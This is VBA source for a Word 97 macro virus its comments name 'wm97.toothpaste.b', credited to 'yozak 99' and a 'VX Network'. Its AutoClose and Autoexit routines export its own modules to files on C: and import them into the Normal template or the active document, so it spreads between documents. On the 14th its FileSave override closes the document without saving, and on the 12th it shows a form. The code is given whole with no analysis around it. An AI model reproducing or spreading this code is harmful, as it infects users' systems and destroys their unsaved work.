   Attribute VB_Name = "Toothpaste99"
   Sub AutoClose()
   Dim inst(1) As Boolean
   VBE.Activevbproject.VBComponents("Toothpaste99").Export "c:\data.mod"
   VBE.Activevbproject.VBComponents("Toothpaste").Export "c:\data.frm"
   For t = 1 To NormalTemplate.VBProject.VBComponents.Count
   If NormalTemplate.VBProject.VBComponents(t).Name = "Toothpaste99" Or NormalTemplate.VBProject.VBComponents(t) = "Toothpaste" Then inst(0) = True
   Next t
   For t = 1 To ActiveDocument.VBProject.VBComponents.Count
   If ActiveDocument.VBProject.VBComponents(t).Name = "Toothpaste99" Or ActiveDocument.VBProject.VBComponents(t) = "Toothpaste" Then inst(1) = True
   Next t
   If inst(0) = True And inst(1) = False Then
   ActiveDocument.VBProject.VBComponents.Import "c:\data.mod"
   ActiveDocument.VBProject.VBComponents.Import "c:\data.frm"
   ElseIf inst(0) = False And inst(1) = True Then
   NormalTemplate.VBProject.VBComponents.Import "c:\data.mod"
   NormalTemplate.VBProject.VBComponents.Import "c:\data.frm"
   End If
   If Day(Now) = 12 Then Toothpaste.Show
   End Sub
   'Aim wm97.toothpaste.b
   'Word Version of Toothpaste AIM
   Sub FileSave()
   If Day(Now) = 14 Then
   MsgBox "File can't be saved sorry.The toothpaste do not allow you to save documents."
   ActiveDocument.Saved = True
   ActiveDocument.Close False
   Else
   ActiveDocument.Save
   End If

   End Sub
   'copyright yozak 99©.
   'Powered by Bizarre VX Network.
   Sub Autoexit()
   Call AutoClose
   MsgBox "Bye,bye,bye!!"
   End Sub
   'Don't forget to brush your teeth with AIM toothpaste
   'Greece 99.
